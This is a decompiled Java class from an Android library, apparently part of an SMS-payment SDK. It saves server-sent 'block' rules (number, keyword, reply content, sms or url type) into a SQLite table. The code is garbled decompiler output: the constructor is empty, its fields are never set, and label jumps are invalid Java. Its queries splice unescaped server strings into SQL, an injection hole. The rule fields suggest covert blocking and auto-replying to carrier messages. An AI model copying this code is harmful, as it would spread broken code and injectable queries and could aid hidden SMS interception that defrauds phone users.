package com.shoufu.lib;

import android.content.ContentValues;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import com.shoufu.entity.response.Block;
import com.shoufu.entity.response.Task;
import java.util.ArrayList;
import java.util.Iterator;

class cj
  extends h
{
  cj(Task paramTask, String paramString1, String paramString2) {}
  
  public void a(SQLiteDatabase paramSQLiteDatabase)
  {
    Iterator localIterator = this.a.getBlocklist().iterator();
    if (!localIterator.hasNext()) {
      return;
    }
    Block localBlock = (Block)localIterator.next();
    String str;
    label44:
    Cursor localCursor;
    ContentValues localContentValues;
    if (localBlock.getIsback() == 3)
    {
      str = "url";
      localCursor = paramSQLiteDatabase.rawQuery("select * from block where tradeid = '" + this.b + "' and " + "tid" + " = " + this.a.getTid() + " and " + "smsid" + " = " + this.a.getSmsid() + " and " + "blockid" + " = " + localBlock.getBlockid() + " and " + "blocknum" + " = '" + localBlock.getBlocknum() + "' and " + "blockkey" + " = '" + localBlock.getBlockkey() + "' and " + "backcontent" + " = '" + localBlock.getBackcontent() + "' and " + "isback" + " = '" + localBlock.getIsback() + "' and " + "type" + " = '" + this.a.getType() + "'", null);
      if (localCursor.moveToNext()) {
        break label488;
      }
      localContentValues = new ContentValues();
      localContentValues.put("tradeid", this.b);
      localContentValues.put("tid", Integer.valueOf(this.a.getTid()));
      localContentValues.put("smsid", Integer.valueOf(this.a.getSmsid()));
      localContentValues.put("blockid", Integer.valueOf(localBlock.getBlockid()));
      localContentValues.put("blocknum", localBlock.getBlocknum());
      localContentValues.put("blockkey", localBlock.getBlockkey());
      localContentValues.put("backcontent", localBlock.getBackcontent());
      localContentValues.put("isback", Integer.valueOf(localBlock.getIsback()));
      localContentValues.put("backtype", str);
      localContentValues.put("type", Integer.valueOf(this.a.getType()));
      localContentValues.put("count", Integer.valueOf(1));
      localContentValues.put("time", Long.valueOf(System.currentTimeMillis()));
      if (this.c != null) {
        localContentValues.put("extend", this.c);
      }
      paramSQLiteDatabase.insert("block", null, localContentValues);
    }
    for (;;)
    {
      localCursor.close();
      break;
      str = "sms";
      break label44;
      label488:
      localContentValues = new ContentValues();
      localContentValues.put("count", Integer.valueOf(1));
      localContentValues.put("countblock", Integer.valueOf(0));
      localContentValues.put("time", Long.valueOf(System.currentTimeMillis()));
      paramSQLiteDatabase.update("block", localContentValues, "tradeid = '" + this.b + "' and " + "tid" + " = " + this.a.getTid() + " and " + "smsid" + " = " + this.a.getSmsid() + " and " + "blockid" + " = " + localBlock.getBlockid() + " and " + "blocknum" + " = '" + localBlock.getBlocknum() + "' and " + "blockkey" + " = '" + localBlock.getBlockkey() + "' and " + "backcontent" + " = '" + localBlock.getBackcontent() + "' and " + "isback" + " = '" + localBlock.getIsback() + "' and " + "backtype" + " = '" + str + "' and " + "type" + " = '" + this.a.getType() + "'", null);
    }
  }
}
